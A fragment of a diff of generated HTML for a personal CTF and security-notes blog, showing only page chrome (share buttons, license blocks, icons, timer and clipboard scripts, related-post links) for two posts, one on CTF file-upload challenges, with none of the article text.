py-3 rounded-lg inline-flex items-center gap-2" aria-label="Generate Share Poster"><span>分享</span></button> <!--[-1--><!--]--><!--]--><!--astro:end--></astro-island> </div> </div> </div> <div id="license-component" class="encrypted-hidden-wrapper"> <div class="relative transition overflow-hidden bg-[var(--license-block-bg)] py-5 px-6 mb-6 rounded-xl license-container onload-animation"> <div class="transition font-bold text-black/75 dark:text-white/75"> First CTF Note </div> <a href="https://freya-we.github.io/posts/first-ctf-note/" class="link text-[var(--primary)]"> https://freya-we.github.io/posts/first-ctf-note/ </a> <div class="flex gap-6 mt-2"> <div> <div class="transition text-black/30 dark:text-white/30 text-sm"> 作者 </div> <div class="transition text-black/75 dark:text-white/75 line-clamp-2"> Freya Augustus </div> </div> <div> <div class="transition text-black/30 dark:text-white/30 text-sm"> 发布于 </div> <div class="transition text-black/75 dark:text-white/75 line-clamp-2"> 2026-02-07 </div> </div> <div> <div class="transition text-black/30 dark:text-white/30 text-sm"> 许可协议 </div> <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" class="link text-[var(--primary)] line-clamp-2">CC BY-NC-SA 4.0</a> </div> </div> <svg width="1em" height="1em" class="transition text-[15rem] absolute pointer-events-none right-6 top-1/2 -translate-y-1/2 text-black/5 dark:text-white/5" data-icon="fa7-brands:creative-commons">   <symbol id="ai:fa7-brands:creative-commons" viewBox="0 0 640 640"><path fill="currentColor" d="m317.8 278.9l-33.2 17.3c-9.4-19.6-25.2-19.9-27.5-19.9c-22.1 0-33.2 14.6-33.2 43.8c0 23.6 9.2 43.8 33.2 43.8c14.5 0 24.6-7.1 30.6-21.3l30.6 15.5c-6.2 11.5-25.7 39-65.1 39c-22.6 0-74-10.3-74-77c0-58.7 43-77.1 72.6-77.1c30.7 0 52.7 11.9 66 35.9m143 0L428 296.2c-9.5-19.8-25.7-19.9-27.9-19.9c-22.1 0-33.2 14.6-33.2 43.8c0 23.5 9.2 43.8 33.2 43.8c14.4 0 24.6-7.1 30.5-21.3l31 15.5c-2.1 3.8-21.4 39-65.1 39c-22.7 0-74-9.9-74-77c0-58.7 43-77.1 72.6-77.1c30.7 0 52.6 11.9 65.6 35.9zM319.6 72C176.7 72 72 187.1 72 320.1c0 138.4 113.6 248 247.6 248c129.9 0 248.4-100.9 248.4-248C568 182.2 461.4 72 319.6 72m.9 450.8c-112.5 0-203.7-93-203.7-202.8c0-105.4 85.4-203.3 203.7-203.3c112.5 0 202.8 89.5 202.8 203.3c0 121.7-99.7 202.8-202.8 202.8"/></symbol><use href="#ai:fa7-brands:creative-commons"></use>  </svg> </div> </div> </div> </div>    <div id="last-modified" data-last-modified="2026-02-07T00:00:00" data-prefix="距离上次编辑: " data-year="年" data-month="月" data-day="天" data-hour="小时" data-minute="分" data-second="秒" style="display: none;"></div> <div class="card-base p-6 mb-4"> <script>
+`.repeat(n+1)}),(async t=>{if(!navigator.clipboard?.writeText)throw new Error("Clipboard API 不可用");await navigator.clipboard.writeText(t)})(i).then(()=>{const t=o.getAttribute("data-timeout-id");t&&clearTimeout(parseInt(t)),o.classList.add("success");const e=setTimeout(()=>{o.classList.remove("success")},1e3);o.setAttribute("data-timeout-id",e.toString())}).catch(t=>{console.error("复制失败:",t)})}});</script> <div class="p-6 bg-(--license-block-bg) rounded-xl mb-6 onload-animation"> <div class="flex flex-col sm:flex-row items-center justify-between gap-4"> <div class="flex items-center gap-3 flex-1"> <div class="flex items-center justify-center h-12 w-12 rounded-lg bg-(--enter-btn-bg)"> <svg width="1em" height="1em" class="text-3xl text-(--primary)" data-icon="material-symbols:share">   <symbol id="ai:material-symbols:share" viewBox="0 0 24 24"><path fill="currentColor" d="M17 22q-1.25 0-2.125-.875T14 19q0-.15.075-.7L7.05 14.2q-.4.375-.925.588T5 15q-1.25 0-2.125-.875T2 12t.875-2.125T5 9q.6 0 1.125.213t.925.587l7.025-4.1q-.05-.175-.062-.337T14 5q0-1.25.875-2.125T17 2t2.125.875T20 5t-.875 2.125T17 8q-.6 0-1.125-.213T14.95 7.2l-7.025 4.1q.05.175.063.338T8 12t-.012.363t-.063.337l7.025 4.1q.4-.375.925-.587T17 16q1.25 0 2.125.875T20 19t-.875 2.125T17 22"/></symbol><use href="#ai:material-symbols:share"></use>  </svg> </div> <div class="flex flex-col gap-1"> <div class="text-[1.0rem] leading-tight text-black/75 dark:text-white/75"> 分享 </div> <p class="text-[0.8rem] leading-tight text-black/75 dark:text-white/75"> 如果这篇文章对你有帮助，欢迎分享给更多人！ </p> </div> </div> <div class="flex items-center gap-3"> <script>(()=>{var a=(s,i,o)=>{let r=async()=>{await(await s())()},t=typeof i.value=="object"?i.value:void 0,c={rootMargin:t==null?void 0:t.rootMargin},n=new IntersectionObserver(e=>{for(let l of e)if(l.isIntersecting){n.disconnect(),r();break}},c);for(let e of o.children)n.observe(e)};(self.Astro||(self.Astro={})).visible=a;window.dispatchEvent(new Event("astro:visible"));})();</script><astro-island uid="ZNvf99" component-url="/_astro/SharePoster._JGmuBmc.js" component-export="default" renderer-url="/_astro/client.svelte.BG8BImUm.js" props="{&quot;title&quot;:[0,&quot;CTF Web 文件上传笔记&quot;],&quot;author&quot;:[0,&quot;Freya Augustus&quot;],&quot;description&quot;:[0,&quot;整理 CTF Web 文件上传题中常见的校验绕过、解析差异和逻辑漏洞。&quot;],&quot;pubDate&quot;:[0,&quot;2026-08-04&quot;],&quot;coverImage&quot;:[0,&quot;&quot;],&quot;url&quot;:[0,&quot;https://freya-we.github.io/posts/ctf-web-file-upload/&quot;],&quot;siteTitle&quot;:[0,&quot;Freya&#39;s Blog&quot;],&quot;avatar&quot;:[0,&quot;/assets/freya/avatar.jpg&quot;]}" ssr client="visible" opts="{&quot;name&quot;:&quot;SharePoster&quot;,&quot;value&quot;:true}" await-children><!--[--><button class="btn-regular px-6 py-3 rounded-lg inline-flex items-center gap-2" aria-label="Generate Share Poster"><span>分享</span></button> <!--[-1--><!--]--><!--]--><!--astro:end--></astro-island> </div> </div> </div> <div id="license-component" class="encrypted-hidden-wrapper"> <div class="relative transition overflow-hidden bg-[var(--license-block-bg)] py-5 px-6 mb-6 rounded-xl license-container onload-animation"> <div class="transition font-bold text-black/75 dark:text-white/75"> CTF Web 文件上传笔记 </div> <a href="https://freya-we.github.io/posts/ctf-web-file-upload/" class="link text-[var(--primary)]"> https://freya-we.github.io/posts/ctf-web-file-upload/ </a> <div class="flex gap-6 mt-2"> <div> <div class="transition text-black/30 dark:text-white/30 text-sm"> 作者 </div> <div class="transition text-black/75 dark:text-white/75 line-clamp-2"> Freya Augustus </div> </div> <div> <div class="transition text-black/30 dark:text-white/30 text-sm"> 发布于 </div> <div class="transition text-black/75 dark:text-white/75 line-clamp-2"> 2026-08-04 </div> </div> <div> <div class="transition text-black/30 dark:text-white/30 text-sm"> 许可协议 </div> <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" class="link text-[var(--primary)] line-clamp-2">CC BY-NC-SA 4.0</a> </div> </div> <svg width="1em" height="1em" class="transition text-[15rem] absolute pointer-events-none right-6 top-1/2 -translate-y-1/2 text-black/5 dark:text-white/5" data-icon="fa7-brands:creative-commons">   <symbol id="ai:fa7-brands:creative-commons" viewBox="0 0 640 640"><path fill="currentColor" d="m317.8 278.9l-33.2 17.3c-9.4-19.6-25.2-19.9-27.5-19.9c-22.1 0-33.2 14.6-33.2 43.8c0 23.6 9.2 43.8 33.2 43.8c14.5 0 24.6-7.1 30.6-21.3l30.6 15.5c-6.2 11.5-25.7 39-65.1 39c-22.6 0-74-10.3-74-77c0-58.7 43-77.1 72.6-77.1c30.7 0 52.7 11.9 66 35.9m143 0L428 296.2c-9.5-19.8-25.7-19.9-27.9-19.9c-22.1 0-33.2 14.6-33.2 43.8c0 23.5 9.2 43.8 33.2 43.8c14.4 0 24.6-7.1 30.5-21.3l31 15.5c-2.1 3.8-21.4 39-65.1 39c-22.7 0-74-9.9-74-77c0-58.7 43-77.1 72.6-77.1c30.7 0 52.6 11.9 65.6 35.9zM319.6 72C176.7 72 72 187.1 72 320.1c0 138.4 113.6 248 247.6 248c129.9 0 248.4-100.9 248.4-248C568 182.2 461.4 72 319.6 72m.9 450.8c-112.5 0-203.7-93-203.7-202.8c0-105.4 85.4-203.3 203.7-203.3c112.5 0 202.8 89.5 202.8 203.3c0 121.7-99.7 202.8-202.8 202.8"/></symbol><use href="#ai:fa7-brands:creative-commons"></use>  </svg> </div> </div> </div> </div>    <div id="last-modified" data-last-modified="2026-08-04T00:00:00" data-prefix="距离上次编辑: " data-year="年" data-month="月" data-day="天" data-hour="小时" data-minute="分" data-second="秒" style="display: none;"></div> <div class="card-base p-6 mb-4"> <script>
 			function runtime() {
 				const lastModifiedElement =
 					document.getElementById("last-modified");
@@ -2242,7 +3322,7 @@ const visitsText = "访问次数";
 					runtimeString;
 			}
 			setInterval(runtime, 1000);
-		</script><div class="flex items-center gap-3"> <div class="flex items-center justify-center h-12 w-12 rounded-lg bg-(--enter-btn-bg)"> <svg width="1em" height="1em" class="text-3xl text-(--primary)" data-icon="material-symbols:history-rounded">   <symbol id="ai:material-symbols:history-rounded" viewBox="0 0 24 24"><path fill="currentColor" d="M12 21q-3.15 0-5.575-1.912T3.275 14.2q-.1-.375.15-.687t.675-.363q.4-.05.725.15t.45.6q.6 2.25 2.475 3.675T12 19q2.925 0 4.963-2.037T19 12t-2.037-4.962T12 5q-1.725 0-3.225.8T6.25 8H8q.425 0 .713.288T9 9t-.288.713T8 10H4q-.425 0-.712-.288T3 9V5q0-.425.288-.712T4 4t.713.288T5 5v1.35q1.275-1.6 3.113-2.475T12 3q1.875 0 3.513.713t2.85 1.924t1.925 2.85T21 12t-.712 3.513t-1.925 2.85t-2.85 1.925T12 21m1-9.4l2.5 2.5q.275.275.275.7t-.275.7t-.7.275t-.7-.275l-2.8-2.8q-.15-.15-.225-.337T11 11.975V8q0-.425.288-.712T12 7t.713.288T13 8z"/></symbol><use href="#ai:material-symbols:history-rounded"></use>  </svg> </div> <div class="flex flex-col gap-1"> <div id="modifiedtime" class="text-[1.0rem] leading-tight text-black/75 dark:text-white/75"></div> <p class="text-[0.8rem] leading-tight text-black/75 dark:text-white/75"> 部分信息可能已经过时 </p> </div> </div> </div> <div class="flex flex-col mb-4 gap-4 overflow-hidden w-full"> <a href="/posts/ctf-web-file-upload/" class="w-full font-bold overflow-hidden active:scale-95"> <div class="btn-card rounded-2xl w-full h-15 max-w-full px-4 flex items-center justify-start! gap-4"> <svg width="1em" height="1em" class="text-[2rem] text-(--primary)" data-icon="material-symbols:chevron-left-rounded">   <symbol id="ai:material-symbols:chevron-left-rounded" viewBox="0 0 24 24"><path fill="currentColor" d="m10.8 12l3.9 3.9q.275.275.275.7t-.275.7t-.7.275t-.7-.275l-4.6-4.6q-.15-.15-.212-.325T8.425 12t.063-.375t.212-.325l4.6-4.6q.275-.275.7-.275t.7.275t.275.7t-.275.7z"/></symbol><use href="#ai:material-symbols:chevron-left-rounded"></use>  </svg> <div class="overflow-hidden transition text-ellipsis whitespace-nowrap max-w-[calc(100%-3rem)] text-black/75 dark:text-white/75"> CTF Web 文件上传笔记 </div> </div> </a>  </div>  <div class="grid grid-cols-1 md:grid-cols-2 gap-4 mb-4"> <div class="card-base p-5 md:p-6 flex flex-col"> <div class="flex items-center gap-2 pb-3 mb-1 border-b border-dashed border-(--line-divider)"> <svg width="1em" height="1em" class="text-xl text-(--primary)" data-icon="material-symbols:signpost">   <symbol id="ai:material-symbols:signpost" viewBox="0 0 24 24"><path fill="currentColor" d="M11 22v-4H6l-3-3l3-3h5v-2H4V4h7V2h2v2h5l3 3l-3 3h-5v2h7v6h-7v4z"/></symbol><use href="#ai:material-symbols:signpost"></use>  </svg> <span class="text-base font-bold text-black/75 dark:text-white/75 transition"> 相关文章 </span> <span class="ml-auto text-xs px-2 py-0.5 rounded-full bg-(--btn-regular-bg) text-(--btn-content) transition"> 智能推荐 </span> </div>  <div class="flex flex-col -mx-1">  <a href="/posts/ctf-web-file-upload/" class="group flex items-center gap-3 px-3 py-3 -mx-1 rounded-lg transition-all hover:bg-black/5 dark:hover:bg-white/5 active:scale-[0.98]"> <div class="shrink-0 w-6 h-6 rounded-md bg-(--enter-btn-bg) text-(--primary) flex items-center justify-center text-sm font-bold transition"> 1 </div> <div class="flex-1 min-w-0"> <div class="font-bold text-sm text-black/75 dark:text-white/75 truncate transition group-hover:text-(--primary)"> CTF Web 文件上传笔记 </div> <div class="flex items-center gap-1.5 text-xs text-black/30 dark:text-white/30 transition mt-1"> <span class="shrink-0 self-end px-1.5 py-0.5 rounded bg-(--btn-regular-bg) text-(--btn-content)"> Web安全 </span> <span class="truncate">整理 CTF Web 文件上传题中常见的校验绕过、解析差异和逻辑漏洞。</span> </div> </div> <svg width="1em" height="1em" viewBox="0 0 24 24" class="shrink-0 text-xl text-black/15 dark:text-white/15 transition group-hover:text-(--primary) group-hover:translate-x-0.5" data-icon="material-symbols:chevron-right-rounded">   <use href="#ai:material-symbols:chevron-right-rounded"></use>  </svg> </a>   </div>  </div> <div class="card-base p-5 md:p-6 flex flex-col"> <div class="flex items-center gap-2 pb-3 mb-1 border-b border-dashed border-(--line-divider)"> <svg width="1em" height="1em" class="text-xl text-(--primary)" data-icon="material-symbols:recommend">   <symbol id="ai:material-symbols:recommend" viewBox="0 0 24 24"><path fill="currentColor" d="M9 18h5.5q.425 0 .788-.213t.512-.587l2.1-4.9q.05-.125.075-.25T18 11.8V11q0-.425-.288-.713T17 10h-4.6l.6-3.4q.05-.25-.025-.475t-.25-.4L12 5l-4.6 5q-.2.2-.3.45T7 11v5q0 .825.588 1.413T9 18m3 4q-2.075 0-3.9-.788t-3.175-2.137T2.788 15.9T2 12t.788-3.9t2.137-3.175T8.1 2.788T12 2t3.9.788t3.175 2.137T21.213 8.1T22 12t-.788 3.9t-2.137 3.175t-3.175 2.138T12 22"/></symbol><use href="#ai:material-symbols:recommend"></use>  </svg> <span class="text-base font-bold text-black/75 dark:text-white/75 transition"> 随机文章 </span> <span class="ml-auto text-xs px-2 py-0.5 rounded-full bg-(--btn-regular-bg) text-(--btn-content) transition"> 随机推荐 </span> </div> <div class="flex flex-col -mx-1">  <a href="/posts/ctf-web-file-upload/" class="group flex items-center gap-3 px-3 py-3 -mx-1 rounded-lg transition-all hover:bg-black/5 dark:hover:bg-white/5 active:scale-[0.98]"> <div class="shrink-0 w-6 h-6 rounded-md bg-(--enter-btn-bg) text-(--primary) flex items-center justify-center text-sm font-bold transition"> 1 </div> <div class="flex-1 min-w-0"> <div class="font-bold text-sm text-black/75 dark:text-white/75 truncate transition group-hover:text-(--primary)"> CTF Web 文件上传笔记 </div> <div class="flex items-center gap-1.5 text-xs text-black/30 dark:text-white/30 transition mt-1"> <span class="shrink-0 self-end px-1.5 py-0.5 rounded bg-(--btn-regular-bg) text-(--btn-content)"> Web安全 </span> <span class="truncate">2026-08-04</span> </div> </div> <svg width="1em" height="1em" viewBox="0 0 24 24" class="shrink-0 text-xl text-black/15 dark:text-white/15 transition group-hover:text-(--primary) group-hover:translate-x-0.5" data-icon="material-symbols:chevron-right-rounded">   <use href="#ai:material-symbols:chevron-right-rounded"></use>  </svg> </a>   </div> </div> </div> <div class="footer col-span-full onload-animation hidden lg:block" data-astro-cid-m6cpsp63> <!--<div class="border-t border-[var(--primary)] mx-16 border-dashed py-8 max-w-[var(--page-width)] flex flex-col items-center justify-center px-6">--> <div class="transition border-t border-black/10 dark:border-white/15 my-10 border-dashed mx-32"></div> <!--<div class="transition bg-[oklch(92%_0.01_var(--hue))] dark:bg-black rounded-2xl py-8 mt-4 mb-8 flex flex-col items-center justify-center px-6">--> <div class="transition border-dashed border-[oklch(85%_0.01_var(--hue))] dark:border-white/15 rounded-2xl mb-12 flex flex-col items-center justify-center px-6"> <div class="transition text-50 text-sm text-center"> <div class="mb-2">© Freya · CTF 与安全学习记录</div> <div class="mb-2">
+		</script><div class="flex items-center gap-3"> <div class="flex items-center justify-center h-12 w-12 rounded-lg bg-(--enter-btn-bg)"> <svg width="1em" height="1em" class="text-3xl text-(--primary)" data-icon="material-symbols:history-rounded">   <symbol id="ai:material-symbols:history-rounded" viewBox="0 0 24 24"><path fill="currentColor" d="M12 21q-3.15 0-5.575-1.912T3.275 14.2q-.1-.375.15-.687t.675-.363q.4-.05.725.15t.45.6q.6 2.25 2.475 3.675T12 19q2.925 0 4.963-2.037T19 12t-2.037-4.962T12 5q-1.725 0-3.225.8T6.25 8H8q.425 0 .713.288T9 9t-.288.713T8 10H4q-.425 0-.712-.288T3 9V5q0-.425.288-.712T4 4t.713.288T5 5v1.35q1.275-1.6 3.113-2.475T12 3q1.875 0 3.513.713t2.85 1.924t1.925 2.85T21 12t-.712 3.513t-1.925 2.85t-2.85 1.925T12 21m1-9.4l2.5 2.5q.275.275.275.7t-.275.7t-.7.275t-.7-.275l-2.8-2.8q-.15-.15-.225-.337T11 11.975V8q0-.425.288-.712T12 7t.713.288T13 8z"/></symbol><use href="#ai:material-symbols:history-rounded"></use>  </svg> </div> <div class="flex flex-col gap-1"> <div id="modifiedtime" class="text-[1.0rem] leading-tight text-black/75 dark:text-white/75"></div> <p class="text-[0.8rem] leading-tight text-black/75 dark:text-white/75"> 部分信息可能已经过时 </p> </div> </div> </div> <div class="flex flex-col mb-4 gap-4 overflow-hidden w-full">  <a href="/posts/first-ctf-note/" class="w-full font-bold overflow-hidden active:scale-95"> <div class="btn-card rounded-2xl w-full h-15 max-w-full px-4 flex items-center justify-end! gap-4"> <div class="overflow-hidden transition text-ellipsis whitespace-nowrap max-w-[calc(100%-3rem)] text-black/75 dark:text-white/75"> First CTF Note </div> <svg width="1em" height="1em" viewBox="0 0 24 24" class="text-[2rem] text-(--primary)" data-icon="material-symbols:chevron-right-rounded">   <use href="#ai:material-symbols:chevron-right-rounded"></use>  </svg> </div> </a> </div>  <div class="grid grid-cols-1 md:grid-cols-2 gap-4 mb-4"> <div class="card-base p-5 md:p-6 flex flex-col"> <div class="flex items-center gap-2 pb-3 mb-1 border-b border-dashed border-(--line-divider)"> <svg width="1em" height="1em" class="text-xl text-(--primary)" data-icon="material-symbols:signpost">   <symbol id="ai:material-symbols:signpost" viewBox="0 0 24 24"><path fill="currentColor" d="M11 22v-4H6l-3-3l3-3h5v-2H4V4h7V2h2v2h5l3 3l-3 3h-5v2h7v6h-7v4z"/></symbol><use href="#ai:material-symbols:signpost"></use>  </svg> <span class="text-base font-bold text-black/75 dark:text-white/75 transition"> 相关文章 </span> <span class="ml-auto text-xs px-2 py-0.5 rounded-full bg-(--btn-regular-bg) text-(--btn-content) transition"> 智能推荐 </span> </div>  <div class="flex flex-col -mx-1">  <a href="/posts/first-ctf-note/" class="group flex items-center gap-3 px-3 py-3 -mx-1 rounded-lg transition-all hover:bg-black/5 dark:hover:bg-white/5 active:scale-[0.98]"> <div class="shrink-0 w-6 h-6 rounded-md bg-(--enter-btn-bg) text-(--primary) flex items-center justify-center text-sm font-bold transition"> 1 </div> <div class="flex-1 min-w-0"> <div class="font-bold text-sm text-black/75 dark:text-white/75 truncate transition group-hover:text-(--primary)"> First CTF Note </div> <div class="flex items-center gap-1.5 text-xs text-black/30 dark:text-white/30 transition mt-1"> <span class="shrink-0 self-end px-1.5 py-0.5 rounded bg-(--btn-regular-bg) text-(--btn-content)"> Notes </span> <span class="truncate">This is a sample note. Replace it with a real CTF writeup when you are ready.</span> </div> </div> <svg width="1em" height="1em" viewBox="0 0 24 24" class="shrink-0 text-xl text-black/15 dark:text-white/15 transition group-hover:text-(--primary) group-hover:translate-x-0.5" data-icon="material-symbols:chevron-right-rounded">   <use href="#ai:material-symbols:chevron-right-rounded"></use>  </svg> </a>   </div>  </div> <div class="card-base p-5 md:p-6 flex flex-col"> <div class="flex items-center gap-2 pb-3 mb-1 border-b border-dashed border-(--line-divider)"> <svg width="1em" height="1em" class="text-xl text-(--primary)" data-icon="material-symbols:recommend">   <symbol id="ai:material-symbols:recommend" viewBox="0 0 24 24"><path fill="currentColor" d="M9 18h5.5q.425 0 .788-.213t.512-.587l2.1-4.9q.05-.125.075-.25T18 11.8V11q0-.425-.288-.713T17 10h-4.6l.6-3.4q.05-.25-.025-.475t-.25-.4L12 5l-4.6 5q-.2.2-.3.45T7 11v5q0 .825.588 1.413T9 18m3 4q-2.075 0-3.9-.788t-3.175-2.137T2.788 15.9T2 12t.788-3.9t2.137-3.175T8.1 2.788T12 2t3.9.788t3.175 2.137T21.213 8.1T22 12t-.788 3.9t-2.137 3.175t-3.175 2.138T12 22"/></symbol><use href="#ai:material-symbols:recommend"></use>  </svg> <span class="text-base font-bold text-black/75 dark:text-white/75 transition"> 随机文章 </span> <span class="ml-auto text-xs px-2 py-0.5 rounded-full bg-(--btn-regular-bg) text-(--btn-content) transition"> 随机推荐 </span> </div> <div class="flex flex-col -mx-1">  <a href="/posts/first-ctf-note/" class="group flex items-center gap-3 px-3 py-3 -mx-1 rounded-lg transition-all hover:bg-black/5 dark:hover:bg-white/5 active:scale-[0.98]"> <div class="shrink-0 w-6 h-6 rounded-md bg-(--enter-btn-bg) text-(--primary) flex items-center justify-center text-sm font-bold transition"> 1 </div> <div class="flex-1 min-w-0"> <div class="font-bold text-sm text-black/75 dark:text-white/75 truncate transition group-hover:text-(--primary)"> First CTF Note </div> <div class="flex items-center gap-1.5 text-xs text-black/30 dark:text-white/30 transition mt-1"> <span class="shrink-0 self-end px-1.5 py-0.5 rounded bg-(--btn-regular-bg) text-(--btn-content)"> Notes </span> <span class="truncate">2026-02-07</span> </div> </div> <svg width="1em" height="1em" viewBox="0 0 24 24" class="shrink-0 text-xl text-black/15 dark:text-white/15 transition group-hover:text-(--primary) group-hover:translate-x-0.5" data-icon="material-symbols:chevron-right-rounded">   <use href="#ai:material-symbols:chevron-right-rounded"></use>  </svg> </a>   </div> </div> </div> <div class="footer col-span-full onload-animation hidden lg:block" data-astro-cid-m6cpsp63> <!--<div class="border-t border-[var(--primary)] mx-16 border-dashed py-8 max-w-[var(--page-width)] flex flex-col items-center justify-center px-6">--> <div class="transition border-t border-black/10 dark:border-white/15 my-10 border-dashed mx-32"></div> <!--<div class="transition bg-[oklch(92%_0.01_var(--hue))] dark:bg-black rounded-2xl py-8 mt-4 mb-8 flex flex-col items-center justify-center px-6">--> <div class="transition border-dashed border-[oklch(85%_0.01_var(--hue))] dark:border-white/15 rounded-2xl mb-12 flex flex-col items-center justify-center px-6"> <div class="transition text-50 text-sm text-center"> <div class="mb-2">© Freya · CTF 与安全学习记录</div> <div class="mb-2">
 &copy; <span id="copyright-year">2026</span> Freya. All Rights Reserved. /
 <a class="transition link text-[var(--primary)] font-medium" href="/rss/" onclick="event.preventDefault(); navigateToPage('/rss/')">RSS</a> /
 <a class="transition link text-[var(--primary)] font-medium" href="/atom/" onclick="event.preventDefault(); navigateToPage('/atom/')">Atom</a> /
